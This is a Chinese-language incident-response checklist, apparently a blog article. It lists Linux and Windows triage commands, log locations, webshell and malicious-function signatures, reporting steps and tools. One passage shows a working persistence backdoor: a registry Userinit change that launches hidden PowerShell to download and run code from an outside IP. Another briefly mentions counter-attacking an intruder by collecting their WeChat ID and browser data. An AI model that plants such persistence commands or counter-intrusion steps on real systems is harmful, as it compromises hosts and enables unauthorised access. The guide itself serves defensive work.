## **引子：**

最近做了一些应急响应，在响应的时候也翻查了不少资料，发现大部分都是按照攻击来分类进行响应工作；寻摸着能不能有个一条龙的线路去进行应急响应(毕竟新手，倍感压力)，

于是粗略的整理了下；期间翻看了很多文章，把我认为可能用到的东西引导到了总结之中，所以本文仅为总结，非全部原创，难免谬误之处，请大家斧正，求大佬们手口留情
(首发猎户攻防实验室)

![1657874900_62d129d4563156affee5c.png!small?1657874900918](https://image.3001.net/images/20220715/1657874900_62d129d4563156affee5c.png!small?1657874900918)

## 目录

1、事件发现  
2、资产信息情况掌握  
3、备份保护  
4、阻断隔离  
5、事件研判  
6、恶意文件等处理  
7、研判结果  
8、处置建议  
9、附录：常用工具、反制、规范指南等

## 一、事件发现

关于事件的发现，通常来源于：

### 1.安全设备

扫描IP 、威胁阻断、 日志审计、 病毒木马、 入侵事件、 异常流量、 暴力破解等

### 2.内/外部通报

如CNNVD/各SRC/HW裁判组等通报信息

### 3.蜜罐捕获

攻击行为、 攻击者画像

### 4.钓鱼监控

  * 恶意样本
  * 恶意URL
  * 恶意邮件

（ 针对恶意邮件，可查看邮件原文，查看发件人的IP地址； X-Originating-IP即为发件人ip地址。）

### 5.其他渠道消息来源

如QQ/微信群或其他如暗网信息等

  

## 二、了解涉事资产部署情况

### 1.部署时间

了解资产部署时间，可在后期推断日志信息，给予有利帮助

### 2.挂载应用

  * 应用架构
  * 服务、功能（上传功能？SQL语句维护功能？）
  * 是否存在第三接口
  * 是否存在第三方平台

  

### 3.端口、服务

开放的访问端口，部署的哪些服务

### 4.业务内容

业务内容是否敏感，核心业务还是边缘业务，业务使用对象是内部还是外部，是否涉及敏感数据等

### 5.是否开放公网访问

仅内网访问还是对外开放，确认应急范围

### 6.是否存在通用密码、弱口令

### 7.是否有维护厂商

### 8.是否纳入安全防护辖区

### 9.历史漏洞情况

通过历史漏洞情况掌握系统可靠性，并确认漏洞是否修复

### 10.是否有定期进行安全扫描

### 11.是否近期有日常维护、安全维护

### 12.是否安装防护软件，软件是否升级

### 13.是否针对热门漏洞升级补丁或修复

## 涉事资产所属部门

确认资产归属部门，方便情况了解及沟通

## 三、备份保护

### 1.系统镜像/快照

是否虚机或云机，可先镜像或快照备份，保留涉事资产镜像

### 2.应用程序备份

对应用程序整体备份，避免涉事环境破坏

### 3.数据库备份

对数据库整体备份，避免涉事环境破坏

### 4.后期排查中发现的可疑文件备份

备份可疑文件可为溯源等行为做信息支撑

## 四、阻断隔离处理

### 业务下线

有下线条件的及时进行业务下线，及时止损；

### 网络隔离阻断

及时对业务资产进行网络阻断隔离；

### 进程阻断

对发现的恶意进程等及时阻断

## 五、事件研判

### 5.1 Linux篇

为避免遗漏，通过以下几个方面进行研判：

### 5.1.1 history

通过执行

> history

或

> cat /root/.bash_history

命令，获取历史操作记录，检查是否有执行可疑命令

### 5.1.2 网络连接（端口）

通过命令查看网络连接及端口连接：

> netstat -anltp

### 5.1.3进程

常用命令：

> ps -ef
>
> ps -aux

查看进程对应pid：

> pgrep -l httpd

查看pid对应进程：

> ls -ll /proc/{PID}

或

> file /proc/{PID}/exe

进程分析：

> lsof -p {PID}

查看进程启动时间：

> ps -p 7224 -o lstart

查看有没有可疑进程

> ps -aef | grep inetd (注：inetd 程序是一个Linux守护进程)

检测隐藏进程：

> ps -ef | awk '{print}' | sort -n |uniq >1

参考：http://cn-sec.com/archives/974710.html

### 5.1.4 文件：

1\. 查看文件时注意查看隐藏文件，如“..”开头的文件夹

> ls -lat

2.查看24小时内修改的文件

> find ./ -mtime 0 -name "*.jsp"

3\. 查看24小时内创建的文件

> find ./ -ctime 0 -name "*.jsp"

4\. 查看文件详情：

stat命令

> stat

确认系统文件是否被替换，如find、wget等 查看文件信息

5\. 遇到无法查看的文件

> lsattr 文件名/文件夹

  

> chattr -i

6\. webshell文件查找

（1）webshell特征

> Darkblade：goaction=login
>
> JspSpy：o=login
>
> PhpSpy：action=phpinfo
>
> Regeorg：cmd=connect
>
> Other：cmd=

（2）恶意函数特征

> PHP：eval(、system(、assert(
>
> JSP：getRunTime(、 FileOutputStream(
>
> ASP：eval(、execute(、 ExecuteGlobal（

7\. 后门文件

（1）webshell

（2）应用程序

如python打包文件：

> python3 pyinstxtractor.py *.exe

### 5.1.5 日志文件

1\. 应用系统日志

（1）中间件日志

> tomcat
>
> nginx
>
> apache
>
> 其他……

（2）应用系统日志

2\. 安全设备日志

3\. 操作系统日志

主要目录/var/log/：

/var/log/cron 计划任务

/var/log/maillog 邮箱

/var/log/message 系统重要日志

/var/log/btmp 错误登录日志 命令：lastb

/var/log/wtmp 登录、注销等日志 命令：last

/var/log/utmp 当前已登录用户日志 命令： who、 w、 users

/var/log/lastlog 所有用户最后一次登录时间 命令：lastlog

### 5.1.6 内存

主要内存马等，检测：

> sc javax.servlet.Servlet

### 5.1.7 应用部署情况相关

  
1\. 框架结构

2\. 网络访问控制（策略）

3\. 通信交互（第三方通信等）

### 5.1.8 历史漏洞

1\. 历史渗透报告

2\. 漏扫结果

3\. 是否通用程序存在CVE

### 5.1.9 关联资产

确认当前资产所关联的其他资产信息，包括：

1\. web前端

2\. web后台

3\. 负载

4\. 中间件

5\. 数据库

6\. 其他

### 5.1.10 恶意IP

1\. IP归属

2\. 开放端口，对应服务 （反向渗透溯源）

3\. 在线态势感知结果

4\. 恶意域名解析情况：域名、注册邮箱、注册电话等

### 5.1.11 其他项

 **1 . 帐号：**

（1）异常账户

（2）特权账号

UID为0 ：

> awk -F: '$3==0{print $1}' /etc/passwd

（3）可远程登录的账号

> awk '/$1|$6/{print $1}' /etc/shadow

（4）其他sudo权限的账号

> more /etc/sudoers | grep -v "^#|^$" | grep "ALL=(ALL)"

（5）查看登陆多久、多少用户，负载

uptime

 **2.计划任务**

查看定时任务

> crontab -l

关注目录:

> /var/spool/cron/*  
> /etc/crontab  
> /etc/cron.d/*  
> /etc/cron.daily/*  
> /etc/cron.hourly/*  
> /etc/cron.monthly/*  
> /etc/cron.weekly/  
> /etc/anacrontab  
> /var/spool/anacron/*

检查系统各个用户下是否存在计划任务

> cat /etc/passwd | cut -f 1 -d : |xargs -I {} crontab -l -u {}

 **3\. 登录日志**

1\. 登录成功的IP

> grep "Accepted " /var/log/secure | awk '{print $11}' | sort | uniq -c | sort
> -nr | more

2.爆破用户名字典

> grep "Failed password" /var/log/secure|perl -e 'while($_=<>){ /for(.*?)
> from/; print "$1n";}'|uniq -c|sort -nr

登录成功的日期、用户名、IP

> grep "Accepted " /var/log/secure | awk '{print $1,$2,$3,$9,$11}'

4\. **启动项**

目录/etc/profile.d/下的shell脚本

> ls -alt /etc/profile.d/*.sh

启动脚本的链接文件

(根据链接文件的名字来判断启动状态K开头表示不启动服务，S打头表示启动服务)

> ls -alt /etc/rc.d/rc{*}.d

服务的启动脚本

> ls -alt /etc/init.d/*

启动项目检查

> chkconfig --list

 **5\. 服务**

 **6.环境变量**

> env

### 5.2 Windows篇

### 5.2.1 账号

查看当前登录账户

> query user

注销用户id

> logoff {ID}

查看用户

> net user

查看用户登录情况

> net user username

检查Guest账号是否被启动

打开本地用户组

> lusrmgr.msc

注册表查看账户，确认系统是否存在隐藏账户

> HKEY_LOCAL_MACHINESAMSAMDomainsUsers\ regedit

检查影子账号，如：

> admin$

### 5.2.2 日志

windows 日志分析：

参考：http://cn-sec.com/archives/1012483.html

### 5.2.3 进程

msinfo32命令

> msinfo32

获取进程md5

> get-process | where path -ne $null | %{Get-FileHash $_.path -Algorithm md5}

查看进程详情

> wmic process get CreationDate,name,processid,commandline,ExecutablePath
> /value

pid进程对应服务

> tasklist /FI “pid eq {pid}” /svc

其他：Process Explorer

### 5.2.4 网络连接

查看：

> netstat -ano

已经成功建立的连接

> netstat -ano | findstr "ESTABLISHED"

### 5.2.5 启动项

> msconfig

  

> wmic startup

  

注册表中启动项:

> HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRun

  

> HKEY_LOCAL_MACHINESoftwareMicrosoftWindowsCurrentVersionRunonce

  

注册表镜像劫持

> HKEY_LOCAL_MACHINESOFTWAREMicrosoftWindowsNTCurrentVersionImage File
> Execution Options

参考： http://cn-sec.com/archives/1000962.html

### 5.2.6 定时任务

at命令

> at

schtasks命令

> schtasks | more

  

> schtasks /query /fo LIST

  

> schtasks /query /v /tn "\Microsoft\windows\Bluetooths" /fo list

  

计划任务清单：

> C:\Windows\System32\Tasks

### 5.2.7 服务

命令：

> services.msc

恶意服务检测

> Get-WmiObject win32_service |?{ $_.name -eq 'svchost.exe' -and $_.PathName
> -notlike '*C:\WINDOWS\System32\svchost.exe*' -and $_.PathName -notlike
> '*c:\Windows\SysWOW64\svchost.exe*'} | select Name, DisplayName, State,
> PathName

  

> Get-WmiObject win32_service | ?{$_.PathName -like '*svchost.exe*'} | select
> Name, DisplayName, @{Name="Path"; Expression={$_.PathName.split('  
> ')[0]}} | Format-List

查看服务详情

> wmic service get name,pathname,processid,startname,status,state /value

### 5.2.8 文件

最近打开的文件

> %UserProfile%Recent

通过hash操作文件：

（1）获取文件MD5的hash

> certutil -hashfile c:\windows\system32\cmd.exe MD5 |findstr /r
> "^[a-fA-F0-9]*$"

（2）查找相同hash值文件

> [array]$md5=Get-FileHash .\\*.exe -Algorithm md5  
> $md5 | Where -Property Hash -in -Value
> "59B18D6146A2AA066F661599C496090D","6FF97A7DABF09EBB07C157F286DC81AD"

（3）删除相同hash值文件

> [array]$md5=Get-FileHash .\\*.exe -Algorithm md5  
> $md5 | Where -Property Hash -in -Value
> "59B18D6146A2AA066F661599C496090D","6FF97A7DABF09EBB07C157F286DC81AD"  
> | Remove-Item

查找某一日期创建的文件

> forfiles /m *.exe /d +2019/2/12 /s /p c:\ /c "cmd /c echo @path @fdate
> @ftime" 2>nul

查看粘滞键exe ： sethc.exe文件的创建、修改时间是否正常

查看隐藏文件

> attrib -s -a -h -r {文件名}

查看放大镜exe ： Magnify.exe文件的创建、修改时间是否正常

### 5.2.9 其他

wmi无文件后门检测

> Get-WmiObject -Namespace root\default -list | Where-Object {$_.name -Match
> "^[a-z]"}  
> Get-WmiObject -Namespace root\subscription -class commandlineeventconsumer  
> Get-WmiObject -Namespace root\subscription -class __eventfilter  
> Get-WmiObject -Namespace root\subscription -class __FilterToConsumerBinding

  

无文件后门实现

> 1、Set-ItemProperty "HKLM:SOFTWAREMicrosoftWINDOWS NTCurrentVersionWinlogon"
> -name Userinit -value "C:Windowssystem32userinit.exe,***************"  
> 2、Set-ItemProperty "HKLM:SOFTWAREMicrosoftWINDOWS NTCurrentVersionWinlogon"
> -name Userinit -value "C:Windowssystem32userinit.exe, powershell.exe -nop -w
> hidden -c "IEX ((new-object
> net.webclient).downloadstring('http://192.168.1.131/a'))""

SDDL隐藏维持

参考：http://cn-sec.com/archives/1000962.html

补丁查看：

> wmic qfe get hotfixid

安装软件列表

> wmic /NAMESPACE:"\\\root\CIMV2" PATH Win32_Product get name /FORMAT:table

快捷方式列表

> wmic PATH Win32_ShortcutFile get name

DNS缓存记录

> ipconfig /displaydns

  

## 六、涉及恶意文件等清理

参考查找出的恶意文件进行清理，同时记得进行备份，以备查

## 七、研判结果

### 7.1 **攻击者画像**

> IP
>
> 域名
>
> shell密码/命名
>
> 昵称ID
>
> 手机号
>
> 邮箱
>
> QQ
>
> 微信
>
> 其他……

  

### 7.2 **总结攻击事件**

总结攻击事件链、路径、工具、IP、攻击手法(钓鱼、社工、web渗透、水坑、鱼叉)

### 7.3 **总结存在漏洞的链路**

如何利用多个漏洞进行攻击渗透等

### 7.4 **总结攻击面**

（1）是否横向移动

（2）影响资产数量

（3）影响数据范围（是否有数据丢失）

## 八、处置建议

### 8.1 **已执行操作**

日志备份

恶意文件备份

恶意文件清理

非法进程终止

非法连接断开

非法IP阻断（安全设备监控）

非法创建的账号清理

禁用或删除多余及可疑的账号

其他……

### 8.2 **后续建议**

（1）针对性建议

针对攻击链路存在的风险进行处理建议

（2）通用建议

程序、插件、模版等版本升级、补丁修复

实时监控、加强监测

参看历史漏洞报告，及时修复安全风险

服务器及应用程序权限最小化管理

上线下删除测试账号

远程连接3389/22执行IP白名单

加强口令管理

细分口令安全、弱口令修复

（3）钓鱼邮件防范措施：

对公司来说：

1)组织员工进行钓鱼邮件防范培训,提高全员网络空间安全防范意识;

2)在公司内部不定期进行钓鱼邮件安全测试，及时发现问题并采取补救措施;

3)使用高安全性邮件系统，并及时配置安全过滤机制;

4)敦促员工安装杀毒软件,并及时更新病毒库.

对个人来说：

1)认真学习CNCERT发布的《钓鱼邮件攻击防范指南》，做到“五要”“五不要”，增强安全防范意识;

2)不要轻信发件人地址显示的“显示名”,遇到索要敏感信息的邮件需要及时通过电话核实;

3)切忌轻易打开邮件中文中的短链接,谨防上当受骗,造成财物损失;

4)安装杀毒软件,邮件附件运行前先进行病毒查杀.

## 九、附录

### 9.1 常用在线工具

威胁信息管理平台 (Beta)：https://ti.watcherlab.com/#/search

勒索病毒引擎

深信服 https://edr.sangfor.com.cn/#/information/ransom_search

360 https://lesuobingdu.360.cn/

奇安信 https://lesuobingdu.qianxin.com/

腾讯 https://guanjia.qq.com/pr/ls/

VenusEye https://lesuo.venuseye.com.cn/

反勒索病毒工具

腾讯 https://habo.qq.com/tool/index

金山毒霸 https://www.duba.net/dbt/wannacry.html

瑞星 http://it.rising.com.cn/fanglesuo/index.html

Avast https://www.avast.com/zh-cn/ransomware-decryption-tools

Github tools https://github.com/jiansiting/Decryption-Tools

https://www.virustotal.com

https://app.any.run/

https://x.threatbook.cn/

https://ti.qianxin.com/

https://www.reg007.com/

https://www.venuseye.com.cn/

https://community.riskiq.com/

### 9.2 常用本地检测工具

### 9.2.1 Linux

linux基线检查脚本

GScan

https://github.com/grayddq/GScan

Linux病毒扫描工具-ClamAV

http://www.clamav.net/download.html

security_check(linux)

https://github.com/ppabc/security_check

linux-2

https://github.com/T0xst/linux

### 9.2.2 Windows

windows下msinfo32.exe

360星图WEB日志分析工具

取证工具

共享访问监控https://www.nirsoft.net/utils/networkopenedfiles-x64.zip

wifi使用记录https://www.nirsoft.net/utils/wifihistoryview.zip

usb使用记录https://www.nirsoft.net/utils/usblogview.zip

内存取证DumpIt

moonsols http://www.moonsols.com/

Volatility

https://www.volatilityfoundation.org/releases-vol3

https://www.volatilityfoundation.org/releases

Ghost 镜像浏览https://www.symantec.com/connect/blogs/ghost-explorer

windows 日志分析工具LogParser

下载:https://www.microsoft.com/en-us/download/confirmation.aspx?id=24659

使用：查询用户登录情况

> LogParser.exe -i:EVT "SELECT TimeGenerated,EXTRACT_TOKEN(Strings,5,'|') AS
> USERNAME,EXTRACT_TOKEN(Strings,5,'|') AS
> SERVICE_NAME,EXTRACT_TOKEN(Strings,5,'|') AS Client_IP FROM
> 'C:Userswp_bj_windowsDesktop安全.evtx' WHERE EventID=4624"

  

查询登录成功的事件

> LogParser.exe -i:EVT –o:DATAGRID "SELECT * FROM
> 'C:Userswp_bj_windowsDesktop安全.evtx' where EventID=4624"

pchunter、火绒剑、auturuns 、Process Explorer、promon、D盾

Windows全日志提取工具FullEventLogView：http://www.nirsoft.net/utils/fulleventlogview-x64.zip

### 9.4 反制

mysql ： 获取微信id、浏览器的sqlite文件

伪装v#p%n文件，放置网站进行下载

jsonp

### 9.5 规范指南

GB/T 24363-2009 《信息安全应急响应计划规范》

GB/Z 20985-2007 《信息安全事件管理指南》

GB/Z 20986-2007 《信息安全事件分类分级指南》

### 9.6 参考

http://cn-sec.com/archives/1039136.html

http://cn-sec.com/archives/498923.html

  

  

  

  

  

  

  

